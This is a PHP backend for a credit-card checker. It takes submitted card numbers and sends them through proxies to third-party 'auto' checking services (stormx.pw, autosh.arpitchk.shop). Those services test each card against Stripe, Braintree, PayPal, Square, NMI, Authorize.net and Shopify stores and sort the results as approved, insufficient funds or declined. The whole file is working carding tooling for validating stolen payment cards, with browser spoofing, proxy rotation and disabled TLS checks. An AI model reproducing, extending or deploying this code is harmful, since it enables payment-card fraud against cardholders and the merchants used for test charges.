<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
set_time_limit(60);
ini_set('max_execution_time', 60);

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

error_log("[" . date('Y-m-d H:i:s') . "] Request received");

// Define available gateways and their API URLs
$gateways = [
    'stripe' => 'https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=mrkustom.com/cc=',
    'shopify' => 'https://autosh.arpitchk.shop/puto.php/?site={site}&cc={cc}&proxy={proxy}',
    'braintree' => 'https://brain.stormx.pw/gateway=braintree/key=darkboy/site=mrkustom.com/cc=',
    'authorize' => 'https://authnet.stormx.pw/gateway=authorize/key=darkboy/site=mrkustom.com/cc=',
    'nmi' => 'https://nmi.stormx.pw/gateway=nmi/key=darkboy/site=mrkustom.com/cc=',
    'paypal' => 'https://paypal.stormx.pw/gateway=paypal/key=darkboy/site=mrkustom.com/cc=',
    'square' => 'https://square.stormx.pw/gateway=square/key=darkboy/site=mrkustom.com/cc='
];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    
    error_log("[" . date('Y-m-d H:i:s') . "] Input received: " . json_encode($input));
    
    $cardData = $input['card'] ?? '';
    $proxy = $input['proxy'] ?? '';
    $gateway = $input['gateway'] ?? 'stripe';
    $shopifySites = $input['shopifySites'] ?? '';
    $shopifyProxies = $input['shopifyProxies'] ?? '';
    
    // Validate gateway selection
    if (!array_key_exists($gateway, $gateways)) {
        error_log("[" . date('Y-m-d H:i:s') . "] Error: Invalid gateway selected: " . $gateway);
        echo json_encode(['error' => 'Invalid gateway selected', 'success' => false]);
        exit;
    }
    
    if (empty($cardData)) {
        error_log("[" . date('Y-m-d H:i:s') . "] Error: Card data empty");
        echo json_encode(['error' => 'Card data is required', 'success' => false]);
        exit;
    }
    
    // Shopify specific validation
    if ($gateway === 'shopify') {
        if (empty($shopifySites) || empty($shopifyProxies)) {
            error_log("[" . date('Y-m-d H:i:s') . "] Error: Shopify gateway requires sites and proxies");
            echo json_encode(['error' => 'Shopify gateway requires both sites and proxies', 'success' => false]);
            exit;
        }
        
        $sites = array_filter(array_map('trim', explode("\n", $shopifySites)));
        $proxies = array_filter(array_map('trim', explode("\n", $shopifyProxies)));
        
        if (count($sites) !== count($proxies)) {
            error_log("[" . date('Y-m-d H:i:s') . "] Error: Shopify sites and proxies count mismatch");
            echo json_encode(['error' => 'Number of Shopify sites and proxies must match', 'success' => false]);
            exit;
        }
        
        if (count($sites) === 0) {
            error_log("[" . date('Y-m-d H:i:s') . "] Error: No valid Shopify sites provided");
            echo json_encode(['error' => 'No valid Shopify sites provided', 'success' => false]);
            exit;
        }
        
        // Auto-filter Shopify resources
        $filteredResources = filterShopifyResources($sites, $proxies);
        error_log("[" . date('Y-m-d H:i:s') . "] Shopify filtered - Sites: " . count($filteredResources['sites']) . ", Proxies: " . count($filteredResources['proxies']));
        
        if (count($filteredResources['sites']) === 0) {
            error_log("[" . date('Y-m-d H:i:s') . "] Error: No working Shopify sites after filtering");
            echo json_encode(['error' => 'No working Shopify sites found after filtering', 'success' => false]);
            exit;
        }
    }
    
    if (function_exists('curl_init')) {
        // Handle Shopify gateway differently
        if ($gateway === 'shopify') {
            $result = processShopifyGateway($cardData, $filteredResources);
            echo json_encode($result);
        } else {
            // Process other gateways normally
            $result = processStandardGateway($gateway, $cardData, $proxy, $gateways);
            echo json_encode($result);
        }
    } else {
        error_log("[" . date('Y-m-d H:i:s') . "] cURL not available");
        echo json_encode(['error' => 'cURL is not available', 'success' => false]);
    }
} else {
    error_log("[" . date('Y-m-d H:i:s') . "] Invalid method: " . $_SERVER['REQUEST_METHOD']);
    echo json_encode(['error' => 'Invalid request method. Expected POST, got ' . $_SERVER['REQUEST_METHOD'], 'success' => false]);
}

/**
 * Process Shopify Gateway with multiple site attempts
 */
function processShopifyGateway($cardData, $filteredResources) {
    $maxAttempts = min(3, count($filteredResources['sites']));
    $lastError = '';
    
    for ($attempt = 0; $attempt < $maxAttempts; $attempt++) {
        $site = $filteredResources['sites'][$attempt];
        $proxy = $filteredResources['proxies'][$attempt];
        
        error_log("[" . date('Y-m-d H:i:s') . "] Shopify Attempt " . ($attempt + 1) . " - Site: " . $site . " | Proxy: " . $proxy);
        
        // Build Shopify API URL with parameters
        $apiUrl = "https://autosh.arpitchk.shop/puto.php/?site=" . urlencode($site) . "&cc=" . urlencode($cardData) . "&proxy=" . urlencode($proxy);
        error_log("[" . date('Y-m-d H:i:s') . "] Shopify API URL: " . $apiUrl);
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $apiUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
        
        // Set headers for Shopify
        $headers = [
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept: application/json, text/plain, */*',
            'Accept-Language: en-US,en;q=0.9',
            'Content-Type: application/json',
            'X-Gateway: Shopify',
            'X-Processor: AutoShopify',
            'X-Attempt: ' . ($attempt + 1)
        ];
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        
        curl_close($ch);
        
        error_log("[" . date('Y-m-d H:i:s') . "] Shopify Response - HTTP: " . $httpCode . " | Response: " . substr($response, 0, 200));
        
        if ($error) {
            $lastError = 'cURL Error: ' . $error;
            error_log("[" . date('Y-m-d H:i:s') . "] Shopify cURL Error: " . $error);
            continue; // Try next site/proxy pair
        }
        
        if ($httpCode === 200 && !empty($response)) {
            $processedResponse = processShopifyResponse($response, $site);
            return [
                'success' => true,
                'response' => $processedResponse,
                'http_code' => $httpCode,
                'proxy_used' => true,
                'gateway' => 'shopify',
                'gateway_name' => 'Shopify',
                'shopify_site' => $site,
                'attempt' => $attempt + 1,
                'raw_response' => $response
            ];
        } else {
            $lastError = 'HTTP ' . $httpCode . ' - ' . $response;
        }
    }
    
    // All attempts failed
    error_log("[" . date('Y-m-d H:i:s') . "] All Shopify attempts failed");
    return [
        'error' => 'All Shopify attempts failed. Last error: ' . $lastError,
        'success' => false,
        'gateway' => 'shopify'
    ];
}

/**
 * Process standard gateways (non-Shopify)
 */
function processStandardGateway($gateway, $cardData, $proxy, $gateways) {
    // Build API URL based on selected gateway
    $apiUrl = $gateways[$gateway] . urlencode($cardData);
    error_log("[" . date('Y-m-d H:i:s') . "] Selected Gateway: " . $gateway);
    error_log("[" . date('Y-m-d H:i:s') . "] API URL: " . $apiUrl);
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $apiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
    
    // Set custom headers based on gateway
    $headers = [
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept: application/json, text/plain, */*',
        'Accept-Language: en-US,en;q=0.9',
        'Content-Type: application/json'
    ];
    
    // Gateway-specific headers
    switch($gateway) {
        case 'stripe':
            $headers[] = 'X-Gateway: Stripe';
            $headers[] = 'X-Processor: AutoStripe';
            break;
        case 'braintree':
            $headers[] = 'X-Gateway: Braintree';
            $headers[] = 'X-Processor: BraintreeDirect';
            break;
        case 'authorize':
            $headers[] = 'X-Gateway: AuthorizeNet';
            break;
        case 'nmi':
            $headers[] = 'X-Gateway: NMI';
            break;
        case 'paypal':
            $headers[] = 'X-Gateway: PayPal';
            break;
        case 'square':
            $headers[] = 'X-Gateway: Square';
            break;
    }
    
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    
    if (!empty($proxy)) {
        $proxyParts = explode(':', $proxy);
        $partCount = count($proxyParts);
        
        if ($partCount == 2) {
            curl_setopt($ch, CURLOPT_PROXY, $proxy);
            error_log("[" . date('Y-m-d H:i:s') . "] Using proxy (ip:port): " . $proxy);
        } elseif ($partCount == 4) {
            $proxyHost = $proxyParts[0] . ':' . $proxyParts[1];
            $proxyUser = $proxyParts[2];
            $proxyPass = $proxyParts[3];
            curl_setopt($ch, CURLOPT_PROXY, $proxyHost);
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyUser . ':' . $proxyPass);
            error_log("[" . date('Y-m-d H:i:s') . "] Using proxy (ip:port:user:pass): " . $proxyHost . " with auth");
        } else {
            curl_setopt($ch, CURLOPT_PROXY, $proxy);
            error_log("[" . date('Y-m-d H:i:s') . "] Using proxy (unknown format): " . $proxy);
        }
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    }
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    
    error_log("[" . date('Y-m-d H:i:s') . "] HTTP Code: " . $httpCode);
    error_log("[" . date('Y-m-d H:i:s') . "] Response: " . substr($response, 0, 200));
    
    curl_close($ch);
    
    if ($error) {
        error_log("[" . date('Y-m-d H:i:s') . "] cURL Error: " . $error);
        return [
            'error' => 'Request failed: ' . $error, 
            'success' => false,
            'gateway' => $gateway
        ];
    } else {
        // Process response based on gateway
        $processedResponse = processGatewayResponse($response, $gateway);
        
        return [
            'success' => true,
            'response' => $processedResponse,
            'http_code' => $httpCode,
            'proxy_used' => !empty($proxy),
            'gateway' => $gateway,
            'gateway_name' => ucfirst($gateway),
            'raw_response' => $response
        ];
    }
}

/**
 * Filter Shopify sites and proxies to remove dead resources
 */
function filterShopifyResources($sites, $proxies) {
    $workingSites = [];
    $workingProxies = [];
    
    for ($i = 0; $i < min(count($sites), count($proxies)); $i++) {
        $site = $sites[$i];
        $proxy = $proxies[$i];
        
        // Basic validation
        if (empty($site) || empty($proxy)) {
            continue;
        }
        
        // Check if site URL is valid
        if (!filter_var($site, FILTER_VALIDATE_URL) && !str_contains($site, '.myshopify.com')) {
            continue;
        }
        
        // Check proxy format
        $proxyParts = explode(':', $proxy);
        if (count($proxyParts) < 2) {
            continue;
        }
        
        // Simple proxy check
        if (checkProxyConnectivity($proxy)) {
            $workingSites[] = $site;
            $workingProxies[] = $proxy;
        }
    }
    
    return [
        'sites' => $workingSites,
        'proxies' => $workingProxies
    ];
}

/**
 * Check if proxy is working (basic connectivity test)
 */
function checkProxyConnectivity($proxy) {
    $testUrl = 'https://httpbin.org/ip';
    $ch = curl_init();
    
    curl_setopt($ch, CURLOPT_URL, $testUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    
    $proxyParts = explode(':', $proxy);
    $partCount = count($proxyParts);
    
    if ($partCount == 2) {
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
    } elseif ($partCount == 4) {
        $proxyHost = $proxyParts[0] . ':' . $proxyParts[1];
        $proxyUser = $proxyParts[2];
        $proxyPass = $proxyParts[3];
        curl_setopt($ch, CURLOPT_PROXY, $proxyHost);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyUser . ':' . $proxyPass);
    }
    
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return $httpCode === 200 && !empty($response);
}

/**
 * Process Shopify specific response
 */
function processShopifyResponse($response, $site) {
    if (empty($response)) {
        return 'No response from Shopify site: ' . $site;
    }
    
    $responseLower = strtolower($response);
    
    if (strpos($responseLower, 'approved') !== false ||
        strpos($responseLower, 'success') !== false ||
        strpos($responseLower, 'charged') !== false ||
        strpos($responseLower, 'live') !== false) {
        return 'SHOPIFY APPROVED [Site: ' . $site . '] - ' . $response;
    } elseif (strpos($responseLower, 'insufficient') !== false ||
             strpos($responseLower, 'cvv') !== false ||
             strpos($responseLower, 'fund') !== false) {
        return 'SHOPIFY INSUFFICIENT FUNDS [Site: ' . $site . '] - ' . $response;
    } else {
        return 'SHOPIFY DECLINED [Site: ' . $site . '] - ' . $response;
    }
}

/**
 * Process gateway response to standardize output
 */
function processGatewayResponse($response, $gateway) {
    if (empty($response)) {
        return 'No response from gateway';
    }
    
    $responseLower = strtolower($response);
    
    switch($gateway) {
        case 'stripe':
            if (strpos($responseLower, 'charged') !== false || 
                strpos($responseLower, 'approve') !== false ||
                strpos($responseLower, 'success') !== false) {
                return 'APPROVED - ' . $response;
            } elseif (strpos($responseLower, 'insufficient') !== false ||
                     strpos($responseLower, 'cvv') !== false ||
                     strpos($responseLower, 'live') !== false) {
                return 'INSUFFICIENT FUNDS - ' . $response;
            } else {
                return 'DECLINED - ' . $response;
            }
            break;
            
        case 'braintree':
            if (strpos($responseLower, 'approved') !== false ||
                strpos($responseLower, 'success') !== false) {
                return 'BRAINTREE APPROVED - ' . $response;
            } elseif (strpos($responseLower, 'insufficient') !== false) {
                return 'BRAINTREE INSUFFICIENT - ' . $response;
            } else {
                return 'BRAINTREE DECLINED - ' . $response;
            }
            break;
            
        default:
            // For other gateways, return as is
            return $response;
    }
}
?>